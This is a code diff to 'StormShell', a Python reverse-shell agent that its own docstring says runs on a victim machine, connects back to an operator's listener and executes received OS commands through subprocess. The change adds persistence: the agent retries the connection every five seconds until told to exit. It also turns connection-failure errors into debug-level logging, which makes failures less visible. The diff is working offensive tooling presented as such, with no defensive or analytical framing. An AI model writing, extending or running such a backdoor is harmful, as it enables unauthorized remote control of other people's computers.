@@ -2,10 +2,14 @@
 """
 StormShell - Agent Module
 
-A lightweight TCP client that connects back to the StormShell listener.
+A resilient TCP client that connects back to the StormShell listener.
 This module runs on the target (victim) machine, establishes a reverse
 TCP connection to the handler, and enters a receive loop — executing
 OS commands via subprocess and returning results to the operator.
+
+If the connection is lost or the listener is unavailable, the agent
+automatically retries at a configurable interval until the operator
+explicitly sends the 'exit' command or the process is interrupted.
 """
 
 import argparse
@@ -14,11 +18,13 @@ import os
 import socket
 import subprocess
 import sys
+import time
 
 # ---------------------------------------------------------------------------
 # Constants
 # ---------------------------------------------------------------------------
-BUFFER_SIZE = 4096  # Max bytes to receive per recv() call
+BUFFER_SIZE = 4096       # Max bytes to receive per recv() call
+RECONNECT_DELAY = 5      # Seconds to wait between reconnection attempts
 
 # ---------------------------------------------------------------------------
 # Logger configuration
@@ -29,14 +35,16 @@ logger = logging.getLogger("stormshell.agent")
 
 class Agent:
     """
-    Reverse-shell agent that initiates an outbound TCP connection to the
-    StormShell listener and enters a receive loop to process commands
-    sent by the operator.
+    Resilient reverse-shell agent that initiates an outbound TCP connection
+    to the StormShell listener.  If the connection fails or drops, the
+    agent automatically retries every RECONNECT_DELAY seconds until the
+    operator sends 'exit' or the process is killed.
 
     Attributes:
         host (str):   IP address of the remote listener.
         port (int):   TCP port of the remote listener.
         sock (socket.socket | None): The client socket instance.
+        _shutdown (bool): Flag set by the 'exit' command to stop reconnecting.
     """
 
     def __init__(self, host: str = "127.0.0.1", port: int = 4444) -> None:
@@ -50,6 +58,7 @@ class Agent:
         self.host: str = host
         self.port: int = port
         self.sock: socket.socket | None = None
+        self._shutdown: bool = False
 
     # ------------------------------------------------------------------
     # Socket lifecycle
@@ -60,15 +69,13 @@ class Agent:
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         logger.debug("Client socket created.")
 
-    def _connect(self) -> None:
+    def _connect(self) -> bool:
         """
         Attempt to connect to the remote StormShell listener.
 
-        Raises:
-            ConnectionRefusedError: If the listener is not running or
-                                    actively rejecting connections.
-            TimeoutError:           If the connection attempt times out.
-            OSError:                For any other network-level failure.
+        Returns:
+            True if the connection was established successfully,
+            False otherwise (caller should retry).
         """
         try:
             self.sock.connect((self.host, self.port))
@@ -76,35 +83,25 @@ class Agent:
                 "Connected to listener at %s:%d", self.host, self.port
             )
             print(f"[+] Connected to {self.host}:{self.port}")
+            return True
         except ConnectionRefusedError:
-            logger.error(
-                "Connection refused by %s:%d — is the listener running?",
-                self.host,
-                self.port,
+            logger.debug(
+                "Connection refused by %s:%d.", self.host, self.port
             )
-            print(
-                f"[!] Connection refused by {self.host}:{self.port}. "
-                f"Make sure the listener is running."
-            )
-            self._cleanup()
-            sys.exit(1)
+            return False
         except TimeoutError:
-            logger.error(
+            logger.debug(
                 "Connection to %s:%d timed out.", self.host, self.port
             )
-            print(f"[!] Connection to {self.host}:{self.port} timed out.")
-            self._cleanup()
-            sys.exit(1)
+            return False
         except OSError as exc:
-            logger.error(
-                "Failed to connect to %s:%d — %s",
+            logger.debug(
+                "Connection failed to %s:%d — %s",
                 self.host,
                 self.port,
                 exc,
             )
-            print(f"[!] Connection error: {exc}")
-            self._cleanup()
-            sys.exit(1)
+            return False
 
     # ------------------------------------------------------------------
     # Command execution helpers
@@ -229,6 +226,7 @@ class Agent:
                 # Handle the 'exit' shutdown command.
                 if command.lower() == "exit":
                     logger.info("Exit command received. Shutting down.")
+                    self._shutdown = True
                     break
 
                 # Handle 'cd' as a special case (persistent directory change).
@@ -275,13 +273,49 @@ class Agent:
 
     def start(self) -> None:
         """
-        Full agent lifecycle: create socket → connect to listener →
-        receive loop → graceful shutdown.
+        Persistent agent lifecycle with automatic reconnection.
+
+        Outer loop: continuously attempts to connect to the listener.
+            If connection fails  → wait RECONNECT_DELAY, retry.
+            If connection drops  → cleanup, wait, retry.
+            If 'exit' received   → set _shutdown flag, break permanently.
+            If KeyboardInterrupt → break permanently.
         """
         try:
-            self._create_socket()
-            self._connect()
-            self._receive_loop()
+            while not self._shutdown:
+                # --- Attempt connection ---
+                self._create_socket()
+                if not self._connect():
+                    self._cleanup()
+                    print(
+                        f"[*] Retrying in {RECONNECT_DELAY}s …"
+                    )
+                    logger.info(
+                        "Reconnecting in %d seconds.", RECONNECT_DELAY
+                    )
+                    time.sleep(RECONNECT_DELAY)
+                    continue
+
+                # --- Connection established — enter command loop ---
+                self._receive_loop()
+
+                # After the receive loop ends, clean up the current socket
+                # before deciding whether to reconnect or exit.
+                self._cleanup()
+
+                if self._shutdown:
+                    break
+
+                # Connection was lost (not an 'exit') — reconnect.
+                print(
+                    f"[*] Connection lost. Reconnecting in "
+                    f"{RECONNECT_DELAY}s …"
+                )
+                logger.info(
+                    "Connection lost. Reconnecting in %d seconds.",
+                    RECONNECT_DELAY,
+                )
+                time.sleep(RECONNECT_DELAY)
 
         except KeyboardInterrupt:
             print("\n[!] Keyboard interrupt received. Shutting down …")
@@ -289,8 +323,8 @@ class Agent:
 
         finally:
             self._cleanup()
-            print("[*] Socket closed. Agent exiting.\n")
-            logger.info("Socket closed. Agent exited.")
+            print("[*] Agent exiting.\n")
+            logger.info("Agent exited.")
 
 
 # ---------------------------------------------------------------------------
